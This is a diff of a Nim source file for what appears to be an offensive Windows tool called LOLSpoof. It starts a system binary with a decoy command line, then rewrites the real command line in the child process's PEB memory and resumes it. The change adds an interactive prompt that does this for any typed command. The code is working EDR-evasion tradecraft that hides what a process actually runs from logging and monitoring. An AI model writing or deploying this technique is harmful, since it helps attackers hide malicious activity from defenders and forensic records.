@@ -1,8 +1,9 @@
+import os
 import winim
+import rdstdin
 import strutils
 
-
-proc executeSpoofedLolbin(realCmdlineN: string) =
+proc executeSpoofedLolbin(realCmdlineN: string): bool =
 
     # Create spoodef cmdline
     var binary = realCmdlineN.split(" ")[0]
@@ -26,7 +27,7 @@ proc executeSpoofedLolbin(realCmdlineN: string) =
         addr si.StartupInfo,
         addr pi
     ) != TRUE:
-        quit()
+        return false
 
     # Get remote PEB address
     var bi: PROCESS_BASIC_INFORMATION
@@ -38,20 +39,20 @@ proc executeSpoofedLolbin(realCmdlineN: string) =
         cast[windef.ULONG](sizeof(bi)),
         addr ret
     ) != 0:
-        quit()
+        return false
     
     # Get RTL_USER_PROCESS_PARAMETERS address
     let peb = bi.PebBaseAddress
     let processParametersOffset = cast[int](peb) + 0x20
     var processParametersAddress: LPVOID
     if ReadProcessMemory(pi.hProcess, cast[LPCVOID](processParametersOffset), addr processParametersAddress, 8, NULL) != TRUE:
-        quit()
+        return false
 
     # Get CommandLine member address
     var cmdLineOffset = cast[int](processParametersAddress) + 0x70 + 0x8
     var cmdLineAddress: LPVOID
     if ReadProcessMemory(pi.hProcess, cast[LPCVOID](cmdLineOffset), addr cmdLineAddress, 8, NULL) != TRUE:
-        quit()
+        return false
     
     # Change command line
     if WriteProcessMemory(
@@ -61,15 +62,23 @@ proc executeSpoofedLolbin(realCmdlineN: string) =
         len(realCmdline) * 2,
         NULL
     ) != TRUE:
-        quit()
+        return false
 
     # Resume process
     ResumeThread(pi.hThread)
+    WaitForSingleObject(pi.hThread, INFINITE)
+    return true
 
 
-
-executeSpoofedLolbin("c:\\windows\\system32\\cmd.exe /c powershell -command get-process chrome")
-
-
-
+when isMainModule:
+    while true:
+        flushFile(stdin)
+        flushFile(stdout)
+        flushFile(stderr)
+        var cmdline = readLineFromStdin("[LOLSpoof] > ")
+        var cmdlineSeq = cmdline.split(" ")
+        var binary = findExe(cmdlineSeq[0])
+        cmdlineSeq[0] = binary
+        cmdline = join(cmdlineSeq, " ")
+        var res = executeSpoofedLolbin(cmdline)
 
